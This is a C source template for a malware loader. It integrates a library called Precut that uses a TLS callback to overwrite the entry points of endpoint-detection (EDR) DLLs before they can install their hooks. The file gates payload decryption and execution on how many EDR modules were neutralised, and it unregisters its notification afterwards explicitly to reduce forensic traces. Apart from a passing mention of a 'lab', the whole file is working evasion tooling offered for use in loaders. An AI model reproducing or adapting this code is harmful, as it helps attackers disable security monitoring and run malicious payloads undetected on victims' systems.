/*
 * ========================================================================
 *  loader_integration.c — template for integrating precut.h into a loader
 * ========================================================================
 *
 * This file shows how to wire Precut into an existing loader that already
 * has its own TLS callback or early-init path. Instead of PRECUT_TLS_AUTO,
 * you call precut_arm() yourself and use the callback + stub count to
 * decide whether to proceed with payload execution.
 *
 * The code below is a self-contained template — copy the parts you need
 * into your loader and adjust the target list. Build with MSVC x64, /MT.
 *
 * Key differences from the standalone example:
 *   - No PRECUT_TLS_AUTO: the TLS callback is yours, not Precut's.
 *   - A stub callback logs each write (using WriteFile, not printf,
 *     because the CRT is not initialised inside TLS).
 *   - main() checks stub_count() to gate payload execution.
 *   - precut_disarm() runs after the payload to clean up the notification.
 */

#define PRECUT_IMPLEMENTATION

/* ---- Target list: replace these with your lab's EDR module names ---- */
#define PRECUT_TARGETS                     \
    PRECUT_PREFIX(L"edr_hook")     /* versioned hooking engine DLL     */ \
    PRECUT_PREFIX(L"edr_dev")      /* companion device-interface DLL   */ \
    PRECUT_EXACT(L"edrclient64.dll")  /* 64-bit in-process client     */ \
    PRECUT_EXACT(L"edrclient.dll")    /* 32-bit in-process client     */

#include "../precut.h"

/* ========================================================================
 *  Stub callback — runs inside TLS, so NO CRT (no printf/sprintf).
 *  WriteFile on the console handle is safe.
 * ======================================================================== */

static void on_stub(const wchar_t *name, void *base, int ok)
{
    HANDLE out = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD written;
    char buf[320];
    char *p = buf;
    int i;

    /* Hand-format: "[precut] stubbed <name> at 0x<base> — <ok/FAIL>\r\n"
     * No CRT, so we build the string byte by byte. */

    /* Prefix */
    {
        const char *tag = ok ? "[precut] stubbed " : "[precut] FAILED  ";
        while (*tag) *p++ = *tag++;
    }

    /* DLL basename (wide -> narrow, ASCII range only) */
    for (i = 0; name[i] && i < 200; i++)
        *p++ = (char)(name[i] & 0x7F);

    /* " at 0x" */
    { const char *s = " at 0x"; while (*s) *p++ = *s++; }

    /* Base address as hex */
    {
        ULONG_PTR addr = (ULONG_PTR)base;
        char hex[17];
        int h = 0, j;
        if (addr == 0) {
            hex[h++] = '0';
        } else {
            while (addr) {
                int d = (int)(addr & 0xF);
                hex[h++] = (char)(d < 10 ? '0' + d : 'a' + d - 10);
                addr >>= 4;
            }
        }
        for (j = h - 1; j >= 0; j--) *p++ = hex[j];
    }

    *p++ = '\r'; *p++ = '\n';

    WriteFile(out, buf, (DWORD)(p - buf), &written, NULL);
}

/* ========================================================================
 *  TLS callback — YOUR entry point, called before main() and before
 *  NtTestAlert drains the EDR's APC queue.
 * ======================================================================== */

static void NTAPI loader_tls_callback(PVOID h, DWORD reason, PVOID r)
{
    (void)h; (void)r;
    if (reason != DLL_PROCESS_ATTACH) return;

    /* Wire up the stub callback so we see what gets hit */
    precut_set_callback(on_stub);

    /* Arm both Write A (PEB walk) and Write B (notification).
     * After this call returns, every matching DLL that the loader maps
     * will have its entry point overwritten before DllMain runs. */
    precut_arm();
}

/* ---- TLS plumbing: register loader_tls_callback with the PE loader -- */

#pragma comment(linker, "/INCLUDE:_tls_used")
#pragma section(".CRT$XLB", long, read)
__declspec(allocate(".CRT$XLB"))
    PIMAGE_TLS_CALLBACK g_loader_tls_cb = loader_tls_callback;
__declspec(thread) static volatile int g_loader_tls_sentinel = 0;

/* ========================================================================
 *  main() — runs AFTER TLS and AFTER NtTestAlert. By this point the EDR
 *  DLLs are mapped but their DllMain never ran. The hooks were never
 *  installed. The loader can now execute its payload safely.
 * ======================================================================== */

int main(void)
{
    int stubs;

    /* Keep TLS alive */
    (void)g_loader_tls_sentinel;

    /* Check how many EDR modules were neutralised */
    stubs = precut_stub_count();

    /* -----------------------------------------------------------
     * YOUR LOADER LOGIC GOES HERE
     *
     * At this point:
     *   - stubs > 0 means EDR hooking DLLs were found and stubbed
     *   - stubs == 0 means no targets were mapped (EDR not present,
     *     or the target list needs updating)
     *
     * Example decision gate:
     *   if (stubs >= EXPECTED_TARGET_COUNT) {
     *       decrypt_payload();
     *       execute_payload();
     *   }
     * ----------------------------------------------------------- */

    (void)stubs;

    /* Unregister the notification — the hooks can no longer be
     * prevented at this point anyway, and removing it reduces the
     * forensic footprint (the callback list in ntdll is walkable). */
    precut_disarm();

    return 0;
}
